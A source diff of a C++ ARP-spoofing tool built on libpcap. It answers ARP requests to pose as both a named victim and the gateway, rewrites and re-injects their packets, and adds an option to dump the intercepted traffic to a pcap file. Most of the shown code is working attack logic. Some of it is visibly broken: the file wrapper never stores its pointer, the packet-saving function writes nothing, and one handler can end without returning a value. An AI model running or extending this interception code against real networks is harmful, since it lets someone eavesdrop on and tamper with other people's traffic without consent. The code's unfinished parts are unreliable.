@@ -28,15 +28,39 @@ namespace
     char    g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
 };
 
+class FileSmartPtr
+{
+public:
+    FileSmartPtr() : m_pFile(NULL) {}
+    ~FileSmartPtr() { this->Close(); }
+    
+    void Attach(FILE* pFile) { this->Close(); }
+    
+    FILE* Get() const { return m_pFile; }
+    
+private:
+    void Close()
+    {
+        if (m_pFile)
+        {
+            fclose(m_pFile);
+            m_pFile = NULL;
+        }
+    }
+    
+    FILE*   m_pFile;
+};
+
 typedef struct
 {
-    pcap_t* handle;
-    u_char  myMAC[ETH_ALEN];
-    u_char  victimMAC[ETH_ALEN];
-    u_char  gatewayMAC[ETH_ALEN];
-    in_addr victimIP;
-    in_addr gatewayIP;
-    bool    bInitialClaimsMade;
+    pcap_t* 		handle;
+    u_char  		myMAC[ETH_ALEN];
+    u_char  		victimMAC[ETH_ALEN];
+    u_char  		gatewayMAC[ETH_ALEN];
+    in_addr 		victimIP;
+    in_addr 		gatewayIP;
+    bool    		bInitialClaimsMade;
+    FileSmartPtr 	file;
 } WorkingSet;
 
 typedef struct
@@ -169,31 +193,34 @@ void WriteEthernet(u_char* pPacket,
     nPos += sizeof(ether_header);
 }
 
-void ChangeEthernetSrc(u_char* pPacket,
-                       const u_char myMAC[ETH_ALEN],
-                       const u_char gatewayMAC[ETH_ALEN],
-                       const u_char victimMAC[ETH_ALEN])
+void HandleIPPacket(WorkingSet& ws,
+					const u_char* pPacket,
+					unsigned long uPacketLen)
 {
-    ether_header* pEth = reinterpret_cast<ether_header*>(pPacket);  
+    u_char pModPacket[uPacketLen];
+    memcpy(pModPacket, pPacket, uPacketLen);
+    ether_header* pEth = reinterpret_cast<ether_header*>(pModPacket);
     
-/*    if (memcmp(pEth->ether_shost, gatewayMAC, ETH_ALEN) == 0)
+    if (memcmp(pEth->ether_shost, ws.gatewayMAC, ETH_ALEN) == 0)
     {
-        printf("Packet: gateway --> victim\n");
-        COPY_OR_ZERO(pEth->ether_dhost, victimMAC, ETH_ALEN);
+        printf("[IP] gateway -> victim\n");
+        COPY_OR_ZERO(pEth->ether_dhost, ws.victimMAC, ETH_ALEN);
     }
     else
-    {*/
-        printf("Packet: victim --> gateway\n");
-        COPY_OR_ZERO(pEth->ether_dhost, gatewayMAC, ETH_ALEN);
-    //}
+    {
+        printf("[IP] victim  -> gateway\n");
+        COPY_OR_ZERO(pEth->ether_dhost, ws.gatewayMAC, ETH_ALEN);
+    }
       
-    COPY_OR_ZERO(pEth->ether_shost, myMAC, ETH_ALEN * sizeof(u_char));
+    COPY_OR_ZERO(pEth->ether_shost, ws.myMAC, ETH_ALEN * sizeof(u_char));
+    
+    pcap_inject(ws.handle, reinterpret_cast<void*>(pModPacket), uPacketLen);
 }
 
 bool IsARPPacket(const u_char* pPacket)
 {
     const ether_header* pEth = reinterpret_cast<const ether_header*>(pPacket);
-    return (pEth->ether_type == ETHERTYPE_ARP);
+    return (ntohs(pEth->ether_type) == ETHERTYPE_ARP);
 }
 
 int CreateARPPacket(WorkingSet& ws,
@@ -258,9 +285,36 @@ inline int ClaimIPAsOwn(WorkingSet& ws,
 
 inline void CreatePacketFilter(const WorkingSet& ws, string& filter)
 {
-    char buf[100];
-    sprintf(buf, "src %s or src %s", inet_ntoa(ws.victimIP), inet_ntoa(ws.gatewayIP));
-    filter = string(buf);
+	filter = "host ";
+	filter += inet_ntoa(ws.victimIP);
+	filter += " or host ";
+	filter += inet_ntoa(ws.gatewayIP);
+}
+
+int HandleARPPacket(WorkingSet& ws, const u_char* pPacket)
+{
+	const ARPPacket* pARPPacket = reinterpret_cast<const ARPPacket*>(pPacket + sizeof(ether_header));
+	
+	in_addr tmp;
+	memcpy(&tmp, pARPPacket->targetIP, sizeof(in_addr));
+	
+	if (strcmp(inet_ntoa(ws.gatewayIP), inet_ntoa(tmp)) == 0)
+	{
+		printf("[ARP] Victim: who is gateway?\n");
+		return ClaimIPAsOwn(ws, ws.gatewayIP, ws.victimIP, ws.victimMAC);
+	}
+	else if (strcmp(inet_ntoa(ws.victimIP), inet_ntoa(tmp)) == 0)
+	{
+		printf("[ARP] Gateway: who is victim?\n");
+		return ClaimIPAsOwn(ws, ws.victimIP, ws.gatewayIP, ws.gatewayMAC); 
+	}
+}
+
+int SavePacket(const WorkingSet& ws, const pcap_pkthdr* pHeader, const u_char* pPacket)
+{
+	MY_ASSERT(ws.file.Get());
+	
+	return 0;
 }
 
 void OnPacketArrival(u_char* args, const pcap_pkthdr* pHeader, const u_char* pPacket)
@@ -269,19 +323,14 @@ void OnPacketArrival(u_char* args, const pcap_pkthdr* pHeader, const u_char* pPa
     
     if (IsARPPacket(pPacket))
     {
-        printf("[OnPacketArrival] ARP Packet\n");
-        ClaimIPAsOwn(*pWs, pWs->gatewayIP, pWs->victimIP, pWs->victimMAC);
-        ClaimIPAsOwn(*pWs, pWs->victimIP, pWs->gatewayIP, pWs->gatewayMAC);  
+        HandleARPPacket(*pWs, pPacket); 
     }
     else
     {
-        printf("[OnPacketArrival] IP Packet\n");
-        u_char pModPacket[pHeader->caplen];
-        memcpy(pModPacket, pPacket, pHeader->caplen);
-        
-        ChangeEthernetSrc(pModPacket, pWs->myMAC, pWs->gatewayMAC, pWs->victimMAC);
-        pcap_inject(pWs->handle, reinterpret_cast<void*>(pModPacket), pHeader->caplen);
-    } 
+    	HandleIPPacket(*pWs, pPacket, pHeader->caplen);
+    }
+    
+    SavePacket(*pWs, pHeader, pPacket);
 }
 
 int main(int argc, char** argv)
@@ -292,6 +341,8 @@ int main(int argc, char** argv)
         printf("Options:\n");
         printf("-d --device [dev]\n");
         printf("  Listen to the [dev]. If not specified, will listen to a device with traffic.\n");
+        printf("-o --output [filename]\n");
+        printf("  Writes dump to [filename]. If not specified, will write to <dev>_<start-time>.pcap\n");
         printf("-g --gateway [ip-addr]\n");
         printf("  Treat [ip-addr] as the gateway. If not specified, will try to auto-detect.\n");
         return EXIT_FAILURE;
@@ -304,11 +355,15 @@ int main(int argc, char** argv)
     printf("Victim: %s\n", inet_ntoa(ws.victimIP));
     
     const char* szDevice   = NULL;
+    const char* szOutput   = NULL;
     
     for (uint8_t i=2; i<argc; i++)
     {
         if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--device") == 0)
             szDevice = argv[++i];
+            
+        if (strcmp(argv[i], "-o") == 0 || strcmp(argv[i], "--output") == 0)
+            szOutput = argv[++i];
     }
 
     if (!szDevice)
